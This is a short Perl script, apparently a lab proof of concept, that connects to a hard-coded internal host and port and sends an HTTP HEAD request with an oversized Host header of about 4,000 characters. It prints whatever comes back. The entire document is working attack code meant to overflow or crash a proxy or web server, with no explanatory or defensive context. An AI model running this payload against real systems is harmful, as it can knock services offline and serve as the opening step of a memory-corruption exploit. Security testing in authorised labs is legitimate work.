use IO::Socket;

my $sock = IO::Socket::INET->new(PeerAddr => '10.11.1.252',
                              PeerPort => '8888',
                              Proto    => 'tcp');
$a = "yc" x 2000;
print $sock "HEAD http://yahoo.com/ HTTP/1.1\r\nHost: yahoo.com:$a\r\n\r\n";
while(<$sock>) {
print;
}
